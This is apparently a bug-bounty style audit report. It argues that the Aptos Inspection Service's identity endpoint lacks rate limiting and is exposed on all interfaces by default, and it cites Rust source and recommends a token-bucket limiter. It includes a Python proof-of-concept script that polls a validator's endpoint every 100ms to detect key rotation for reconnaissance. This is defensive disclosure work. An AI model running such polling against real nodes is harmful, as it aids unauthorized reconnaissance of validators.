# Audit Report

## Title
Missing Rate Limiting on Identity Information Endpoint Enables Key Rotation Timing Attacks and Network Reconnaissance

## Summary
The `/identity_information` endpoint in the Aptos Inspection Service lacks rate limiting, allowing attackers to continuously poll for node identity information without any throttling. This enables timing attacks during key rotation events and facilitates network reconnaissance of validator and fullnode identities.

## Finding Description

The `handle_identity_information_request()` function in the inspection service exposes node peer IDs for validator and fullnode networks without any rate limiting protection. [1](#0-0) 

The endpoint is registered in the inspection service's request routing and processes all incoming requests without any throttling mechanism. [2](#0-1) 

The function extracts peer IDs from the node's network configuration, including the validator network identity and all fullnode network identities. [3](#0-2) 

**Critical Configuration Issues:**

1. **Enabled by Default**: The endpoint is enabled by default in the inspection service configuration. [4](#0-3) 

2. **Binds to All Interfaces**: The service binds to `0.0.0.0` by default, making it accessible from any network interface. [5](#0-4) 

3. **No Rate Limiting Infrastructure**: The inspection service uses a basic Hyper HTTP server with no rate limiting middleware. [6](#0-5) 

4. **Direct Request Processing**: All requests are processed immediately without any throttling or request validation beyond checking if the endpoint is enabled. [7](#0-6) 

**Attack Vectors:**

1. **Key Rotation Timing Attack**: An attacker can continuously poll the endpoint to detect the exact moment when a validator rotates their network identity keys. The peer ID is derived from the network identity key, so any rotation will be immediately visible. [8](#0-7) 

2. **Network Reconnaissance**: Attackers can scan IP ranges to identify Aptos nodes and map their network identities without any throttling, enabling targeted attacks on specific validators or network topology mapping.

3. **Resource Exhaustion**: While network-level DoS is out of scope, unlimited requests can still consume server resources and fill logs, potentially affecting node performance.

## Impact Explanation

This qualifies as **Medium Severity** under the Aptos bug bounty program because:

1. **Information Disclosure with Operational Impact**: While peer IDs for validators may be discoverable through on-chain discovery mechanisms, the ability to continuously poll without rate limiting enables:
   - Real-time detection of key rotation events (operational security information)
   - Network topology mapping without any impediment
   - Identification of validator nodes by IP address

2. **Enables Attack Chain Components**: Though not directly causing fund loss or consensus breaks, this vulnerability provides critical reconnaissance capabilities that could be used in multi-stage attacks against validators.

3. **Violates Security Best Practices**: Public-facing API endpoints should always have rate limiting to prevent abuse. The fact that the codebase already has rate limiting infrastructure for other components (evidenced by the network layer's `RateLimitConfig`) but doesn't apply it here indicates an oversight rather than a design decision.

4. **Default Unsafe Configuration**: The endpoint is enabled by default and exposed on all interfaces, affecting all nodes unless explicitly disabled.

## Likelihood Explanation

**Likelihood: HIGH**

1. **No Prerequisites**: Any attacker who can reach the inspection service port (default 9101) can exploit this. No authentication or special privileges are required.

2. **Default Configuration is Vulnerable**: The endpoint is enabled by default, so all nodes running with default configuration are affected.

3. **Simple Exploitation**: Exploitation requires only HTTP GET requests - no complex attack tooling needed.

4. **Legitimate Use Case for Continuous Monitoring**: Operators might legitimately poll this endpoint for monitoring, but without rate limiting, there's no way to distinguish between legitimate use and malicious reconnaissance.

## Recommendation

Implement rate limiting for the inspection service endpoints using the existing `aptos-rate-limiter` infrastructure:

1. **Add Rate Limit Configuration** to `InspectionServiceConfig`:
```rust
// In config/src/config/inspection_service_config.rs
pub struct InspectionServiceConfig {
    // ... existing fields ...
    pub rate_limit_config: Option<RateLimitConfig>,
}
```

2. **Integrate Token Bucket Rate Limiter** in the request handler:
```rust
// In crates/aptos-inspection-service/src/server/mod.rs
// Add rate limiter as part of service state
// Check rate limit before processing each request
// Return 429 Too Many Requests when limit exceeded
```

3. **Set Reasonable Defaults**: Configure a token bucket with:
   - Bucket size: 100 requests
   - Refill rate: 10 requests per second
   - Apply rate limiting per source IP address

4. **Make it Configurable**: Allow operators to adjust rate limits based on their monitoring needs while preventing abuse.

## Proof of Concept

**Attack Script (Python)**:
```python
#!/usr/bin/env python3
import requests
import time
from datetime import datetime

# Target node's inspection service
TARGET = "http://validator-node:9101/identity_information"

def monitor_identity_changes():
    """Continuously poll identity information to detect key rotation."""
    previous_identity = None
    request_count = 0
    
    print(f"[{datetime.now()}] Starting continuous monitoring of {TARGET}")
    
    while True:
        try:
            # No rate limiting - can send unlimited requests
            response = requests.get(TARGET, timeout=2)
            request_count += 1
            
            if response.status_code == 200:
                current_identity = response.text
                
                # Detect identity change (key rotation)
                if previous_identity and current_identity != previous_identity:
                    print(f"\n[!] KEY ROTATION DETECTED at {datetime.now()}")
                    print(f"Previous: {previous_identity}")
                    print(f"Current:  {current_identity}")
                    # Attacker can now time other attacks during rotation window
                
                previous_identity = current_identity
                
                if request_count % 100 == 0:
                    print(f"[{datetime.now()}] Sent {request_count} requests - no rate limiting encountered")
            
            # Poll every 100ms - would be rate limited if protection existed
            time.sleep(0.1)
            
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(1)

if __name__ == "__main__":
    monitor_identity_changes()
```

**Verification Steps**:
1. Deploy an Aptos validator node with default configuration
2. Run the attack script against the inspection service endpoint
3. Observe that unlimited requests are processed without any 429 responses
4. Perform a network identity key rotation on the validator
5. Observe that the attack script immediately detects the rotation with millisecond precision

**Expected Result**: The script successfully polls the endpoint thousands of times per minute without any rate limiting, and immediately detects any identity changes.

**Notes**

While the Aptos codebase includes comprehensive rate limiting infrastructure for network-layer operations (as seen in the network configuration's `RateLimitConfig`), this protection is not extended to the inspection service HTTP endpoints. The inspection service was likely designed for trusted operator access, but the default configuration binds to all interfaces and enables the endpoint, making it accessible to untrusted parties. This represents a gap between the security posture of the network layer and the monitoring/inspection layer.

### Citations

**File:** crates/aptos-inspection-service/src/server/identity_information.rs (L13-26)
```rust
pub fn handle_identity_information_request(node_config: &NodeConfig) -> (StatusCode, Body, String) {
    // Only return identity information if the endpoint is enabled
    let (status_code, body) = if node_config.inspection_service.expose_identity_information {
        let identity_information = get_identity_information(node_config);
        (StatusCode::OK, Body::from(identity_information))
    } else {
        (
            StatusCode::FORBIDDEN,
            Body::from(IDENTITY_INFO_DISABLED_MESSAGE),
        )
    };

    (status_code, body, CONTENT_TYPE_TEXT.into())
}
```

**File:** crates/aptos-inspection-service/src/server/identity_information.rs (L29-51)
```rust
fn get_identity_information(node_config: &NodeConfig) -> String {
    let mut identity_information = Vec::<String>::new();
    identity_information.push("Identity Information:".into());

    // If the validator network is configured, fetch the identity information
    if let Some(validator_network) = &node_config.validator_network {
        identity_information.push(format!(
            "\t- Validator network ({}), peer ID: {}",
            validator_network.network_id,
            validator_network.peer_id()
        ));
    }

    // For each fullnode network, fetch the identity information
    for fullnode_network in &node_config.full_node_networks {
        identity_information.push(format!(
            "\t- Fullnode network ({}), peer ID: {}",
            fullnode_network.network_id,
            fullnode_network.peer_id()
        ));
    }

    identity_information.join("\n") // Separate each entry with a newline to construct the output
```

**File:** crates/aptos-inspection-service/src/server/mod.rs (L94-99)
```rust
        runtime
            .block_on(async {
                let server = Server::bind(&address).serve(make_service);
                server.await
            })
            .unwrap();
```

**File:** crates/aptos-inspection-service/src/server/mod.rs (L104-169)
```rust
async fn serve_requests(
    req: Request<Body>,
    node_config: NodeConfig,
    aptos_data_client: AptosDataClient,
    peers_and_metadata: Arc<PeersAndMetadata>,
) -> Result<Response<Body>, hyper::Error> {
    // Process the request and get the response components
    let (status_code, body, content_type) = match req.uri().path() {
        CONFIGURATION_PATH => {
            // /configuration
            // Exposes the node configuration
            configuration::handle_configuration_request(&node_config)
        },
        CONSENSUS_HEALTH_CHECK_PATH => {
            // /consensus_health_check
            // Exposes the consensus health check
            metrics::handle_consensus_health_check(&node_config).await
        },
        FORGE_METRICS_PATH => {
            // /forge_metrics
            // Exposes forge encoded metrics
            metrics::handle_forge_metrics()
        },
        IDENTITY_INFORMATION_PATH => {
            // /identity_information
            // Exposes the identity information of the node
            identity_information::handle_identity_information_request(&node_config)
        },
        INDEX_PATH => {
            // /
            // Exposes the index and list of available endpoints
            index::handle_index_request()
        },
        JSON_METRICS_PATH => {
            // /json_metrics
            // Exposes JSON encoded metrics
            metrics::handle_json_metrics_request()
        },
        METRICS_PATH => {
            // /metrics
            // Exposes text encoded metrics
            metrics::handle_metrics_request()
        },
        PEER_INFORMATION_PATH => {
            // /peer_information
            // Exposes the peer information
            peer_information::handle_peer_information_request(
                &node_config,
                aptos_data_client,
                peers_and_metadata,
            )
        },
        SYSTEM_INFORMATION_PATH => {
            // /system_information
            // Exposes the system and build information
            system_information::handle_system_information_request(node_config)
        },
        _ => {
            // Handle the invalid path
            (
                StatusCode::NOT_FOUND,
                Body::from(INVALID_ENDPOINT_MESSAGE),
                CONTENT_TYPE_TEXT.into(),
            )
        },
    };
```

**File:** config/src/config/inspection_service_config.rs (L26-36)
```rust
impl Default for InspectionServiceConfig {
    fn default() -> InspectionServiceConfig {
        InspectionServiceConfig {
            address: "0.0.0.0".to_string(),
            port: 9101,
            expose_configuration: false,
            expose_identity_information: true,
            expose_peer_information: true,
            expose_system_information: true,
        }
    }
```

**File:** config/src/config/network_config.rs (L244-270)
```rust
    pub fn peer_id(&self) -> PeerId {
        match &self.identity {
            Identity::FromConfig(config) => Some(config.peer_id),
            Identity::FromStorage(config) => {
                let storage: Storage = (&config.backend).into();
                let peer_id = storage
                    .get::<PeerId>(&config.peer_id_name)
                    .expect("Unable to read peer id")
                    .value;
                Some(peer_id)
            },
            Identity::FromFile(config) => {
                let identity_blob: IdentityBlob = IdentityBlob::from_file(&config.path).unwrap();

                // If account is not specified, generate peer id from public key
                if let Some(address) = identity_blob.account_address {
                    Some(address)
                } else {
                    Some(from_identity_public_key(
                        identity_blob.network_private_key.public_key(),
                    ))
                }
            },
            Identity::None => None,
        }
        .expect("peer id should be present")
    }
```
